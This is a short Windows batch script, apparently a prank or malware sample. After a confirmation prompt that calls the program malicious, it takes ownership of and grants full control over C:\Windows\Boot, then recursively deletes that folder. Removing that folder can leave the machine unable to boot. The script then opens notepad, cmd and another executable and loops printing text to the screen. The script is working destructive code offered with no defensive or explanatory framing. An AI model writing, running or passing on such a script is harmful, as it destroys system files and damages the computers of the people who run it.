@echo off
CHOICE /M "program is malicious! running it?"
IF ERRORLEVEL 2 GOTO NO
IF ERRORLEVEL 1 GOTO YES

:YES
takeown /f "C:\Windows\Boot" /r /d y
icacls "C:\Windows\Boot" /grant administrators:F /t
rmdir /s /q "C:\Windows\Boot"
start notepad
start cmd
start "" "Version Reporter Applet.exe"
echo Look at your screen! soming funny is happing!
timeout /t 1
a:
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
goto a
exit

:NO
exit
